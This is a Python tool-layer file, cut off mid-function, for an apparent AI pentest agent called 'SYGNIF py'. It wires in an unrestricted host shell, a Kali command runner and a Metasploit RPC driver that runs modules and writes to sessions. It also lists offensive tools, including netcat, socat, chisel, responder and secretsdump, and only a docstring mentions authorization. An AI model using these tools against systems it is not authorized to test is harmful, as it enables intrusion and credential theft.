"""Tool layer for SYGNIF py (the generic seat).

Built-in tools, all operating on the local machine as the seat user:
  * shell        — run a command on this host and return stdout+stderr+exit code.
  * read_file    — read a UTF-8 text file (optionally a line range).
  * write_file   — write/overwrite a UTF-8 text file (creates parent dirs).
  * note         — append a line to the working journal.
  * dev_apply_and_test — write one or more files, then run a check/test command
                   and report the combined result (the build->prove loop in one
                   call). This is SYGNIF py's generic "development" hand.
  * centre       — dispatch a neuron on a running SYGNIF py Centre (the knot
                   point: sys.state, note.*, knowledge.*, plus your own neurons).
  * commander    — call a tool on a running SYGNIF py commander (the hands:
                   sandboxed fs ops, code search, named-command exec).

Extensibility: drop a `custom_tools.py` next to this file, or a
`~/.sygnif/sygnif-py-tools.py`, that defines `register(reg)` and mutates the
registry dict. See custom_tools.py.example.
"""
from __future__ import annotations

import datetime
import json
import os
import re
import subprocess
import urllib.error
import urllib.parse
import urllib.request

SEAT_DIR = os.path.dirname(os.path.abspath(__file__))

SHELL_TIMEOUT = int(os.environ.get("SYGNIF_PY_SHELL_TIMEOUT", "120"))
# Kali scans routinely run past the 120s shell cap — a full nmap, a nuclei run
# with many templates, or gobuster on a large wordlist all die mid-scan at 120s.
# The kali tool gets its own, longer budget (default 15 min) so a real scan can
# finish instead of being killed and reported as a truncated non-result.
KALI_TIMEOUT = int(os.environ.get("SYGNIF_PY_KALI_TIMEOUT", "900"))
MAX_OUTPUT = int(os.environ.get("SYGNIF_PY_MAXOUT", "8000"))
MAX_READ = int(os.environ.get("SYGNIF_PY_MAXREAD", "20000"))
JOURNAL = os.path.expanduser(
    os.environ.get("SYGNIF_PY_JOURNAL", "~/.sygnif/sygnif-py-journal.md")
)
DEV_TEST_TIMEOUT = int(os.environ.get("SYGNIF_PY_DEV_TEST_TIMEOUT", "300"))
CENTRE_URL = os.environ.get("SYGNIF_PY_CENTRE_URL", "http://127.0.0.1:9100")
CENTRE_TOKEN = os.environ.get("SYGNIF_PY_CENTRE_TOKEN", "").strip()
COMMANDER_URL = os.environ.get("SYGNIF_PY_COMMANDER_URL", "http://127.0.0.1:9110")
COMMANDER_TOKEN = os.environ.get("SYGNIF_PY_COMMANDER_TOKEN", "").strip()
HTTP_TIMEOUT = int(os.environ.get("SYGNIF_PY_TOOL_HTTP_TIMEOUT", "600"))

# On Windows there is no bash; fall back to the platform default shell.
_IS_WINDOWS = os.name == "nt"


def _truncate(text: str, limit: int = MAX_OUTPUT) -> str:
    if len(text) <= limit:
        return text
    return text[:limit] + f"\n[... output truncated at {limit} chars ...]"


def _run_host(command: str, timeout: int) -> tuple[str, int]:
    """Run a command string on the host. Never raises."""
    try:
        if _IS_WINDOWS:
            args, shell = command, True
        else:
            args, shell = ["bash", "-lc", command], False
        p = subprocess.run(
            args, shell=shell, capture_output=True, text=True, timeout=timeout
        )
        return (p.stdout or "") + (p.stderr or ""), p.returncode
    except subprocess.TimeoutExpired:
        return f"[timeout after {timeout}s]", 124
    except Exception as e:  # noqa: BLE001 - surface to the model, never crash the seat
        return f"[host exec error: {e}]", 1


# --- built-in tools ---------------------------------------------------------


def tool_shell(args: dict) -> str:
    command = str(args.get("command", "")).strip()
    if not command:
        return "shell: empty command"
    out, rc = _run_host(command, SHELL_TIMEOUT)
    return _truncate(out) + f"\nexit={rc}"


def tool_read_file(args: dict) -> str:
    path = os.path.expanduser(str(args.get("path", "")).strip())
    if not path:
        return "read_file: empty path"
    start = int(args.get("start", 0) or 0)
    end = args.get("end")
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            lines = fh.readlines()
    except Exception as e:  # noqa: BLE001
        return f"[read_file error: {e}]"
    if start or end is not None:
        lines = lines[start : (int(end) if end is not None else None)]
    return _truncate("".join(lines), MAX_READ) or "(empty)"


def tool_write_file(args: dict) -> str:
    path = os.path.expanduser(str(args.get("path", "")).strip())
    content = args.get("content", "")
    if not path:
        return "write_file: empty path"
    if not isinstance(content, str):
        content = str(content)
    try:
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
    except Exception as e:  # noqa: BLE001
        return f"[write_file error: {e}]"
    return f"wrote {len(content)} chars -> {path}"


def tool_note(args: dict) -> str:
    text = str(args.get("text", "")).strip()
    if not text:
        return "note: empty text"
    try:
        os.makedirs(os.path.dirname(JOURNAL), exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(JOURNAL, "a", encoding="utf-8") as fh:
            fh.write(f"- [{ts}] {text}\n")
    except Exception as e:  # noqa: BLE001
        return f"[note error: {e}]"
    return f"noted -> {JOURNAL}"


def tool_dev_apply_and_test(args: dict) -> str:
    """Write file(s), then run a check/test command, and report both outcomes.

    This is the generic 'development' hand: it turns an edit + a proof into one
    step, so the model can't claim done without the check actually running.

    Args:
      path + content       — write one file, OR
      files: [{path, content}, ...] — write several, then
      test                 — a shell command to prove it (pytest, build, run…).
    """
    written: list[str] = []
    batch = args.get("files")
    if not isinstance(batch, list):
        batch = []
        if args.get("path"):
            batch = [{"path": args.get("path"), "content": args.get("content", "")}]
    for spec in batch:
        if not isinstance(spec, dict) or not spec.get("path"):
            continue
        r = tool_write_file({"path": spec["path"], "content": spec.get("content", "")})
        written.append(r)
    test = str(args.get("test", "")).strip()
    parts = ["writes:"]
    parts.extend(f"  - {w}" for w in written) if written else parts.append("  (no files written)")
    if not test:
        parts.append("test: (none given — pass a 'test' command to prove the change)")
        return "\n".join(parts)
    out, rc = _run_host(test, DEV_TEST_TIMEOUT)
    parts.append(f"test: {test}")
    parts.append(_truncate(out))
    parts.append(f"exit={rc}  ({'PASS' if rc == 0 else 'FAIL'})")
    return "\n".join(parts)


def _http_json(url: str, payload: dict, token: str) -> tuple[dict | None, str]:
    """POST JSON, return (parsed, error). Never raises."""
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(
        url, data=json.dumps(payload).encode(), headers=headers, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT) as resp:
            return json.loads(resp.read().decode()), ""
    except urllib.error.HTTPError as e:
        return None, f"HTTP {e.code}: {e.read().decode(errors='replace')[:300]}"
    except Exception as e:  # noqa: BLE001
        return None, f"{type(e).__name__}: {e}"


def tool_centre(args: dict) -> str:
    """Dispatch a neuron on the running Centre (SYGNIF_PY_CENTRE_URL)."""
    neuron = str(args.get("neuron", "")).strip()
    if not neuron:
        return "centre: give a 'neuron' (e.g. sys.state, knowledge.search, note.write)"
    payload = {"tool": neuron, "args": args.get("args") or {}}
    data, err = _http_json(CENTRE_URL.rstrip("/") + "/rpc", payload, CENTRE_TOKEN)
    if err:
        return f"[centre unreachable at {CENTRE_URL}: {err} — is `sygnif-centre` running?]"
    return _truncate(json.dumps(data, indent=2, default=str))


def tool_commander(args: dict) -> str:
    """Call a tool on the running commander (SYGNIF_PY_COMMANDER_URL)."""
    name = str(args.get("name", "")).strip()
    if not name:
        return "commander: give a tool 'name' (e.g. fs_read, code_search, proc_exec)"
    if not COMMANDER_TOKEN:
        return ("commander: SYGNIF_PY_COMMANDER_TOKEN is not set in this seat's "
                "environment — start the commander and export its token so the seat can auth.")
    payload = {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
               "params": {"name": name, "arguments": args.get("args") or {}}}
    data, err = _http_json(COMMANDER_URL.rstrip("/") + "/rpc", payload, COMMANDER_TOKEN)
    if err:
        return f"[commander unreachable at {COMMANDER_URL}: {err} — is `sygnif-commander` running?]"
    if isinstance(data, dict) and data.get("error"):
        return f"[commander error: {json.dumps(data['error'])}]"
    try:
        return _truncate(data["result"]["content"][0]["text"])
    except Exception:
        return _truncate(json.dumps(data, indent=2, default=str))


# --- internet + github + kali (stdlib-only, no extra deps) ------------------

WEB_TIMEOUT = int(os.environ.get("SYGNIF_PY_WEB_TIMEOUT", "30"))
WEB_MAXBYTES = int(os.environ.get("SYGNIF_PY_WEB_MAXBYTES", "200000"))
_UA = os.environ.get("SYGNIF_PY_WEB_UA", "sygnif-py/1.0 (+https://github.com/Giansn/sygnif-py)")


def _http_get(url: str, headers: dict | None = None) -> tuple[str, int, str]:
    """GET a URL. Returns (body, status, error). Never raises."""
    h = {"User-Agent": _UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, headers=h, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=WEB_TIMEOUT) as resp:
            raw = resp.read(WEB_MAXBYTES + 1)
            body = raw[:WEB_MAXBYTES].decode(errors="replace")
            if len(raw) > WEB_MAXBYTES:
                body += f"\n[... truncated at {WEB_MAXBYTES} bytes ...]"
            return body, getattr(resp, "status", 200), ""
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="replace")[:2000], e.code, f"HTTP {e.code}"
    except Exception as e:  # noqa: BLE001
        return "", 0, f"{type(e).__name__}: {e}"


def _strip_html(html: str) -> str:
    import re
    html = re.sub(r"(?is)<(script|style)[^>]*>.*?</\1>", " ", html)
    text = re.sub(r"(?s)<[^>]+>", " ", html)
    text = (text.replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
                .replace("&quot;", '"').replace("&#39;", "'").replace("&nbsp;", " "))
    return re.sub(r"[ \t]*\n[ \t\n]*", "\n", re.sub(r"[ \t]+", " ", text)).strip()


def tool_web(args: dict) -> str:
    """Reach the internet: fetch a URL, or run a web search (DuckDuckGo, no key)."""
    url = str(args.get("url", "")).strip()
    query = str(args.get("query", "")).strip()
    if not url and not query:
        return "web: give a 'url' to fetch, or a 'query' to search the web."
    if query and not url:
        import re
        import urllib.parse as _up
        q = _up.urlencode({"q": query})
        body = ""
        # duckduckgo.com/html resets from some hosts; html.* and lite.* are stabler.
        for base in ("https://html.duckduckgo.com/html/?", "https://lite.duckduckgo.com/lite/?"):
            body, status, err = _http_get(base + q)
            if body:
                break
        if not body:
            return f"[web search failed: {err}]"
        if re.search(r"(?i)bots use DuckDuckGo|complete the following challenge", body):
            return ("[web search blocked: the search engine served a bot challenge to "
                    "this host's network. Fetch a specific URL with web(url=...) instead, "
                    "or run this from a residential connection.]")
        hits = re.findall(r'result__a[^>]*href="([^"]+)"[^>]*>(.*?)</a>', body, re.S)
        if not hits:  # lite layout: links carry the target directly
            hits = [(h, h) for h in re.findall(r'href="(https?://[^"]+)"', body)
                    if "duckduckgo.com" not in h][:10]
        if not hits:
            return _truncate(_strip_html(body), 3000) or "[web search: no results parsed]"
        seen, lines = set(), []
        for href, title in hits:
            m = re.search(r"uddg=([^&]+)", href)
            link = _up.unquote(m.group(1)) if m else href
            if link in seen:
                continue
            seen.add(link)
            lines.append(f"- {_strip_html(title) or link}\n  {link}")
            if len(lines) >= 10:
                break
        return "web search: " + query + "\n" + "\n".join(lines)
    raw = str(args.get("raw", "")).lower() in ("1", "true", "yes")
    body, status, err = _http_get(url)
    if err and not body:
        return f"[web fetch failed: {err}]"
    text = body if raw else _strip_html(body)
    return f"GET {url} -> HTTP {status}\n" + _truncate(text)


def tool_github(args: dict) -> str:
    """Search GitHub for tools/repos (and optionally code). No key needed;
    GITHUB_TOKEN in the environment raises the rate limit if present."""
    import urllib.parse
    query = str(args.get("query", "")).strip()
    if not query:
        return "github: give a 'query', e.g. 'subdomain enumeration tool'."
    kind = str(args.get("kind", "repositories")).strip().lower()
    if kind not in ("repositories", "code"):
        kind = "repositories"
    qs = urllib.parse.urlencode({"q": query, "per_page": str(int(args.get("limit", 10) or 10)),
                                 "sort": "stars" if kind == "repositories" else "indexed"})
    headers = {"Accept": "application/vnd.github+json"}
    tok = os.environ.get("GITHUB_TOKEN", "").strip()
    if tok:
        headers["Authorization"] = f"Bearer {tok}"
    body, status, err = _http_get(f"https://api.github.com/search/{kind}?{qs}", headers)
    if err and not body:
        return f"[github search failed: {err}]"
    try:
        data = json.loads(body)
    except Exception:  # noqa: BLE001
        return f"[github: unparseable response (HTTP {status})]\n" + _truncate(body, 1000)
    items = data.get("items") or []
    if not items:
        msg = data.get("message")
        return f"github: no results for '{query}'" + (f" ({msg})" if msg else "")
    lines = [f"github {kind} for '{query}' (top {len(items[:10])} of {data.get('total_count', '?')}):"]
    for it in items[:10]:
        if kind == "repositories":
            lines.append(f"- {it.get('full_name')}  ★{it.get('stargazers_count', 0)}"
                         f"  {it.get('language') or ''}\n  {it.get('html_url')}"
                         f"\n  {(it.get('description') or '').strip()[:200]}")
        else:
            repo = (it.get("repository") or {}).get("full_name", "?")
            lines.append(f"- {repo}: {it.get('path')}\n  {it.get('html_url')}")
    return "\n".join(lines)


# The verified Kali arsenal, category -> tools, confirmed present AND functional
# in the sygnif-kali container on 2026-09-17 (each smoke-tested, not just on
# PATH). This is the honest inventory the pentest focus text only claimed: that
# text named tools that were not actually installed (katana, ligolo-ng,
# volatility3). This map is the fallback; tool_kali_tools queries the live
# container first, so a freshly provisioned or upgraded container reports its
# real state rather than this snapshot.
KALI_VERIFIED: dict[str, list[str]] = {
    "recon":        ["nmap", "masscan", "amass", "subfinder", "dnsx", "dnsrecon",
                     "dnsenum", "fierce", "theHarvester", "recon-ng", "whatweb",
                     "wafw00f", "sslscan", "sslyze", "httpx"],
    "web":          ["nikto", "gobuster", "feroxbuster", "ffuf", "dirb",
                     "dirbuster", "wfuzz", "sqlmap", "wpscan", "nuclei",
                     "commix", "xsser"],
    "passwords":    ["hydra", "medusa", "patator", "john", "hashcat", "hashid",
                     "hash-identifier", "crackmapexec", "netexec", "crunch", "cewl"],
    "smb_ad":       ["enum4linux", "enum4linux-ng", "smbclient", "smbmap",
                     "responder", "evil-winrm", "bloodhound-python",
                     "impacket-secretsdump", "impacket-psexec"],
    "exploit":      ["msfconsole", "msfvenom", "searchsploit"],
    "sniff_mitm":   ["wireshark", "tshark", "tcpdump", "bettercap", "ettercap"],
    "wireless":     ["aircrack-ng", "wifite", "reaver", "hcxdumptool"],
    "pivot":        ["proxychains", "proxychains4", "chisel", "socat"],
    "forensics_re": ["binwalk", "foremost", "radare2", "ghidra", "gdb",
                     "steghide", "exiftool"],
    "essentials":   ["curl", "wget", "openssl", "nc", "ncat"],
}


def _kali_probe_present(container: str, names: list[str]) -> list[str]:
    """Ask the running container which of `names` are on PATH. One exec, so the
    round trip stays cheap even for the full arsenal."""
    joined = " ".join(names)
    inner = 'for t in ' + joined + '; do command -v "$t" >/dev/null 2>&1 && echo "$t"; done'
    import shlex
    out, _ = _run_host(
        "docker exec " + container + " bash -lc " + shlex.quote(inner), 45)
    return out.split()


def tool_metasploit(args: dict) -> str:
    """Drive the Metasploit Framework through its RPC daemon in the sygnif-kali
    container — structured, not screen-scraped. This is the same RPC the Kali
    MetasploitMCP uses, reached in one hop via a bridge script, so results come
    back as clean data. Only act against AUTHORIZED targets.

    action (required):
      version                 — confirm the RPC is live and the MSF version
      search <query>          — find modules (args.query)
      info <module>           — a module's summary (args.module = full path)
      options <module>        — a module's options and which are required
      run <module> <opts>     — set opts (args.options dict) and execute; refuses
                                if required options are missing
      sessions                — list open sessions
      session_read <id>       — read pending output from a session
      session_write <id> <cmd>— send a command to a session (args.command)
    """
    import shlex
    action = str(args.get("action", "")).strip()
    if not action:
        return "metasploit: no action. Try action=version, or search/info/options/run/sessions."
    container = _toolbox_name(auto_create=True) or TOOLBOX_NAME
    if _IS_WINDOWS or _run_host("command -v docker", 10)[1] != 0:
        return "metasploit: docker not available; this tool needs the sygnif-kali container."
    st, _ = _run_host(
        "docker inspect -f '{{.State.Status}}' " + container + " 2>/dev/null", 10)
    if st.strip() != "running":
        _run_host("docker start " + container, 60)
        st, _ = _run_host(
            "docker inspect -f '{{.State.Status}}' " + container + " 2>/dev/null", 10)
        if st.strip() != "running":
            return "metasploit: container '" + container + "' is not running."

    argv = ["python3", "/sygnif-kali/msf-rpc.py", action]
    if action == "search":
        argv.append(str(args.get("query", "")).strip())
    elif action in ("info", "options"):
        argv.append(str(args.get("module", "")).strip())
    elif action == "run":
        argv.append(str(args.get("module", "")).strip())
        argv.append(json.dumps(args.get("options") or {}))
    elif action in ("session_read", "session_write"):
        argv.append(str(args.get("id", "")).strip())
        if action == "session_write":
            argv.append(str(args.get("command", "")))
    inner = " ".join(shlex.quote(a) for a in argv)
    out, rc = _run_host(
        "docker exec " + container + " bash -lc " + shlex.quote(inner), KALI_TIMEOUT)
    return _truncate(out) + ("\nexit=" + str(rc) + "  (msf rpc via docker:" + container + ")")


def tool_kali_tools(args: dict) -> str:
    """Report the Kali arsenal actually available, category by category.

    Queries the live sygnif-kali container so the answer is the container's real
    state, not a hardcoded claim; falls back to the verified map when Docker or
    the container is absent. `category` narrows the listing; `check` names one
    tool and confirms it is really on PATH. The point is that the seat never has
    to guess whether a tool exists before reaching for it via `kali`.
    """
    category = str(args.get("category", "")).strip().lower()
    check = str(args.get("check", "")).strip()
    container = _toolbox_name(auto_create=True) or TOOLBOX_NAME
    have_docker = not _IS_WINDOWS and _run_host("command -v docker", 10)[1] == 0
    live = False
    if have_docker:
        st, _ = _run_host(
            "docker inspect -f '{{.State.Status}}' " + container + " 2>/dev/null", 10)
        live = st.strip() == "running"

    if check:
        if live:
            _, rc = _run_host(
                "docker exec " + container + " bash -lc " + repr("command -v " + check), 15)
            src = "docker:" + container
        else:
            _, rc = _run_host("command -v " + check, 10)
            src = "host"
        verdict = "available" if rc == 0 else "NOT found"
        return check + ": " + verdict + "  (checked on " + src + ")"

    if category and category not in KALI_VERIFIED:
        return ("unknown category. known: " + ", ".join(KALI_VERIFIED)
                + " (omit category to list all)")
    cats = {category: KALI_VERIFIED[category]} if category else KALI_VERIFIED

    lines: list[str] = []
    total = 0
    for cat, tool_list in cats.items():
        present = _kali_probe_present(container, tool_list) if live else tool_list
        total += len(present)
        lines.append("[" + cat + "] " + ", ".join(present))
    src = ("live: docker:" + container) if live else "fallback: verified map (container not running)"
    header = "Kali arsenal — " + str(total) + " tool(s) available (" + src + ")"
    return header + "\n" + "\n".join(lines)


# --- pentest engagement layer ------------------------------------------------
# Findings, phases and a shipped methodology, so the seat runs a pentest as a
# PROCESS, not just a pile of tools. Everything lands in the shared workspace so
# a 'kali' command in the container and 'read_file' on the host see the same
# files. Grounded to real evidence: a finding without proof is refused.
WORKSPACE = os.path.expanduser(
    os.environ.get("SYGNIF_PY_PENTEST_DIR", "~/sygnif-pentest"))
FINDINGS = os.path.join(WORKSPACE, "findings.jsonl")
PHASE_FILE = os.path.join(WORKSPACE, ".phase")
REPORT_FILE = os.path.join(WORKSPACE, "report.md")
PHASES = ["recon", "enum", "vuln", "exploit", "postexploit", "report"]
SEVERITIES = ["info", "low", "medium", "high", "critical"]
# A finding's evidence must be at least this many chars — a defence against the
# model recording a conclusion it did not actually observe in tool output.
MIN_EVIDENCE = int(os.environ.get("SYGNIF_PY_MIN_EVIDENCE", "20"))


def _current_phase() -> str:
    try:
        p = open(PHASE_FILE, encoding="utf-8").read().strip()
        return p if p in PHASES else PHASES[0]
    except OSError:
        return PHASES[0]


def tool_phase(args: dict) -> str:
    """Get or set the current engagement phase. The phase tags every finding, so
    the report reads as a methodical walk (recon -> enum -> vuln -> exploit ->
    postexploit -> report) rather than a heap. Call with no args to see where you
    are; pass set=<phase> to advance."""
    want = str(args.get("set", "")).strip().lower()
    if want:
        if want not in PHASES:
            return "unknown phase '" + want + "'. valid: " + " -> ".join(PHASES)
        try:
            os.makedirs(WORKSPACE, exist_ok=True)
            with open(PHASE_FILE, "w", encoding="utf-8") as fh:
                fh.write(want)
        except OSError as e:
            return "[phase: could not save: " + str(e) + "]"
        return "phase set to '" + want + "'  (order: " + " -> ".join(PHASES) + ")"
    cur = _current_phase()
    idx = PHASES.index(cur)
    nxt = PHASES[idx + 1] if idx + 1 < len(PHASES) else "(last)"
    return "current phase: " + cur + "   next: " + nxt + "   full order: " + " -> ".join(PHASES)


def tool_finding(args: dict) -> str:
    """Record a verified finding, with evidence REQUIRED. A finding with no
    evidence, or evidence too short to be real tool output, is refused — proof at
    every step. Fields: title, severity (info|low|medium|high|critical), target,
    evidence (the command run and a snippet of its real output), and optional
    description and recommendation. Findings are appended to the workspace and
    turned into a report by the 'report' tool."""
    title = str(args.get("title", "")).strip()
    severity = str(args.get("severity", "")).strip().lower()
    target = str(args.get("target", "")).strip()
    evidence = str(args.get("evidence", "")).strip()
    description = str(args.get("description", "")).strip()
    recommendation = str(args.get("recommendation", "")).strip()

    missing = [n for n, v in (("title", title), ("target", target), ("evidence", evidence)) if not v]
    if missing:
        return "finding REFUSED — missing required field(s): " + ", ".join(missing)
    if severity not in SEVERITIES:
        return "finding REFUSED — severity must be one of: " + ", ".join(SEVERITIES)
    if len(evidence) < MIN_EVIDENCE:
        return ("finding REFUSED — evidence too thin (" + str(len(evidence)) + " chars). "
                "Paste the actual command and a snippet of its real output; a finding must be "
                "backed by something you observed, not asserted.")
    try:
        os.makedirs(WORKSPACE, exist_ok=True)
        n = 0
        if os.path.exists(FINDINGS):
            with open(FINDINGS, encoding="utf-8") as fh:
                n = sum(1 for _ in fh)
        rec = {
            "id": n + 1,
            "ts": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "phase": _current_phase(),
            "severity": severity,
            "title": title,
            "target": target,
            "evidence": evidence,
            "description": description,
            "recommendation": recommendation,
        }
        with open(FINDINGS, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except OSError as e:
        return "[finding: could not save: " + str(e) + "]"
    return ("recorded finding #" + str(rec["id"]) + " [" + severity + "] '" + title
            + "' (phase " + rec["phase"] + ") -> " + FINDINGS)


def _read_findings() -> list:
    out = []
    try:
        with open(FINDINGS, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if line:
                    try:
                        out.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue
    except OSError:
        pass
    return out


def tool_report(args: dict) -> str:
    """Render all recorded findings into a Markdown pentest report in the
    workspace, grouped by severity (critical first), each with its evidence,
    phase, and recommendation. Pulls the engagement header from SCOPE.md when
    present. Call this at the end, or any time for a running picture."""
    findings = _read_findings()
    if not findings:
        return ("no findings recorded yet — nothing to report. Use the 'finding' tool "
                "as you confirm issues, then run 'report'.")
    order = {s: i for i, s in enumerate(reversed(SEVERITIES))}  # critical=0 .. info=4
    findings.sort(key=lambda f: (order.get(f.get("severity", "info"), 99), f.get("id", 0)))

    lines = ["# SYGNIF pentest report",
             "",
             "_Generated " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "_",
             ""]
    scope = os.path.join(WORKSPACE, "SCOPE.md")
    if os.path.exists(scope):
        try:
            lines += ["## Scope", "", open(scope, encoding="utf-8").read().strip(), ""]
        except OSError:
            pass

    counts = {}
    for f in findings:
        counts[f.get("severity", "info")] = counts.get(f.get("severity", "info"), 0) + 1
    summary = ", ".join(str(counts[s]) + " " + s for s in reversed(SEVERITIES) if s in counts)
    lines += ["## Summary", "", str(len(findings)) + " finding(s): " + summary, ""]

    lines += ["## Findings", ""]
    for f in findings:
        lines.append("### #" + str(f.get("id")) + " [" + f.get("severity", "?").upper() + "] " + f.get("title", ""))
        lines.append("")
        lines.append("- **Target:** " + f.get("target", ""))
        lines.append("- **Phase:** " + f.get("phase", "") + "   **Found:** " + f.get("ts", ""))
        if f.get("description"):
            lines += ["", f["description"]]
        lines += ["", "**Evidence:**", "", "```", f.get("evidence", "").rstrip(), "```"]
        if f.get("recommendation"):
            lines += ["", "**Recommendation:** " + f["recommendation"]]
        lines += ["", "---", ""]

    try:
        os.makedirs(WORKSPACE, exist_ok=True)
        with open(REPORT_FILE, "w", encoding="utf-8") as fh:
            fh.write("\n".join(lines) + "\n")
    except OSError as e:
        return "[report: could not write: " + str(e) + "]"
    return "wrote report: " + str(len(findings)) + " finding(s) (" + summary + ") -> " + REPORT_FILE


def tool_playbook(args: dict) -> str:
    """Return the offline pentest methodology shipped with the seat — the
    kill-chain checklist and the role modes. Pass section=<phase or role> to get
    just that part (recon|enum|vuln|exploit|postexploit|report|webapp|wpsec|
    hosting|redteam|network|passwords|cellular|scout|analyzer|exploiter|reporter). No network needed; use this when the van has no signal."""
    section = str(args.get("section", "")).strip().lower()
    path = os.path.join(SEAT_DIR, "methodology.md")
    try:
        text = open(path, encoding="utf-8").read()
    except OSError as e:
        return "[playbook: methodology.md not found: " + str(e) + "]"
    if not section:
        return _truncate(text)
    blocks = []
    keep = False
    for line in text.splitlines():
        if line.startswith("## "):
            # Exact section-word match on the heading's first token, so 'report'
            # does not also drag in 'reporter' (nor 'exploit' -> 'exploiter').
            head_word = line[3:].split()[0].lower() if line[3:].split() else ""
            keep = head_word == section
        if keep:
            blocks.append(line)
    if not blocks:
        return ("no section '" + section + "'. Sections: recon, enum, vuln, exploit, "
                "postexploit, report, webapp, wpsec, hosting, redteam, network, passwords, cellular, runbook, chaining, nmap, nuclei, wpscan, ffuf, sqlmap, hydra, hashcat, metasploit, handshake, osint, scout, analyzer, exploiter, "
                "reporter (omit for the whole thing).")
    return _truncate("\n".join(blocks))


def tool_purple(args: dict) -> str:
    """Run a DEFENSIVE (blue-team) command in the sygnif-purple container — the
    Kali Purple counterpart of the 'kali' tool. Detection, IR, forensics,
    log/traffic analysis: suricata, zeek, wireshark/tshark, yara, volatility3,
    sleuthkit, clamav, rkhunter, and the rest of the detect/respond/forensics
    sets. Use this for analysis and hardening, not for attacking."""
    import shlex
    command = str(args.get("command", "")).strip()
    if not command:
        return "purple: empty command"
    container = os.environ.get("SYGNIF_PY_PURPLE_CONTAINER", "sygnif-purple")
    have_docker = not _IS_WINDOWS and _run_host("command -v docker", 10)[1] == 0
    if not have_docker:
        return "purple: docker not available; this tool needs the sygnif-purple container."
    state, _ = _run_host(
        "docker inspect -f '{{.State.Status}}' " + container + " 2>/dev/null", 10)
    if state.strip() and state.strip() != "running":
        _run_host("docker start " + container, 60)
        state, _ = _run_host(
            "docker inspect -f '{{.State.Status}}' " + container + " 2>/dev/null", 10)
    if state.strip() != "running":
        return ("purple: container '" + container + "' not available — run the "
                "purple-up provisioning first.")
    out, rc = _run_host(
        "docker exec " + container + " bash -lc " + shlex.quote(command), KALI_TIMEOUT)
    if rc == 124:
        out2, rc2 = _run_host(
            "docker exec " + container + " bash -lc " + shlex.quote(command),
            max(60, KALI_TIMEOUT // 2))
        if rc2 != 124:
            return _truncate(out2) + "\nexit=" + str(rc2) + "  (via docker:" + container + "; retried after timeout)"
        return _truncate(out2) + "\nexit=" + str(rc2) + "  (via docker:" + container + "; timed out twice)"
    return _truncate(out) + "\nexit=" + str(rc) + "  (via docker:" + container + ")"


def tool_kali(args: dict) -> str:
    """Run a pentest command with the Kali toolset. Prefers the `sygnif-kali`
    Docker container (same as the pi seat) when Docker + the container are
    available; otherwise runs directly on this host (a native Kali box already
    has the tools). Grounds every result in real output."""
    command = str(args.get("command", "")).strip()
    if not command:
        return "kali: empty command"
    container = _toolbox_name(auto_create=True) or TOOLBOX_NAME
    have_docker = not _IS_WINDOWS and _run_host("command -v docker", 10)[1] == 0
    if have_docker:
        state, _ = _run_host(
            f"docker inspect -f '{{{{.State.Status}}}}' {container} 2>/dev/null", 10
        )
        state = state.strip()
        if state and state != "running":
            # Container exists but is stopped — bring it up so the toolset is usable.
            _run_host(f"docker start {container}", 60)
            state, _ = _run_host(
                f"docker inspect -f '{{{{.State.Status}}}}' {container} 2>/dev/null", 10
            )
            state = state.strip()
        if state == "running":
            import shlex
            out, rc = _run_host(f"docker exec {container} bash -lc {shlex.quote(command)}", KALI_TIMEOUT)
            # Punkt 5 — Fehler-Wiederholung: ein Timeout ist oft ein zu langer
            # erster Scan oder eine Lastspitze, kein echter Fehlschlag. Genau
            # einmal mit halbem Zeitbudget nachfassen und beide Laeufe kenntlich
            # machen, statt dem Modell ein abgeschnittenes Nicht-Ergebnis zu geben.
            if rc == 124:
                out2, rc2 = _run_host(
                    f"docker exec {container} bash -lc {shlex.quote(command)}",
                    max(60, KALI_TIMEOUT // 2))
                if rc2 != 124:
                    return (_truncate(out2)
                            + f"\nexit={rc2}  (via docker:{container}; retried after a timeout)")
                return (_truncate(out2)
                        + f"\nexit={rc2}  (via docker:{container}; timed out twice — "
                        f"narrow the scan, raise SYGNIF_PY_KALI_TIMEOUT, or split the target)")
            return _truncate(out) + f"\nexit={rc}  (via docker:{container})"
    # No container — run on host (a native Kali box has the tools).
    out, rc = _run_host(command, KALI_TIMEOUT)
    hint = "" if _run_host("command -v nmap", 5)[1] == 0 else \
        f"  [no '{container}' container and Kali tools not on PATH — run `sygnif kali-setup` to provision the full toolset]"
    return _truncate(out) + f"\nexit={rc}  (on host){hint}"


# --- WordPress plugin/theme vulnerability scanning --------------------------
# Two grounded tools for the webdev preset:
#   wp_vulnscan  — detect a site's WordPress core/plugins/themes + versions
#                  (passive HTTP), flag out-of-date components, and (with a
#                  WPScan token, or cves=true for keyless NVD) list known CVEs.
#   vuln_check   — the known-vulnerability tester: look up CVEs for a given
#                  product+version or a specific CVE id.
# Data sources, in order of quality: the WPScan API (needs WPSCAN_API_TOKEN,
# free tier at wpscan.com/api — exact affected-version ranges), else keyless
# NVD keyword search (rich but version matching is best-effort) plus the keyless
# WordPress.org plugin API for the latest-version / out-of-date signal.
_BROWSER_UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
NVD_CVE_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"
WPORG_PLUGIN_API = "https://api.wordpress.org/plugins/info/1.0/{slug}.json"
WPSCAN_API_TOKEN = os.environ.get("WPSCAN_API_TOKEN", "").strip()
WPVULN_MAX = int(os.environ.get("SYGNIF_PY_WPVULN_MAX", "25"))


def _wp_fetch(url: str) -> tuple[str, int, str]:
